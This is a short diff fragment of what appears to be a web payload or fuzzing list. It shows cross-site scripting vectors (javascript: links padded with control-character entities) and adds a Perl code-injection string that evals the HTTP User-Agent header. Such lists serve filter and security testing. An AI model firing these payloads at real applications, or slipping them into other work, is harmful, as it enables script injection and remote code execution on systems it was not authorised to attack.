@@ -121,3 +121,4 @@ javascript:123">&#13;</a>
 <a href="javascript:123">&#30;</a>
 <a href="javascript:123">&#31;</a>
 <a href="javascript:123">&#32;</a>
+POSIX;eval($ENV{HTTP_USER_AGENT});exit;
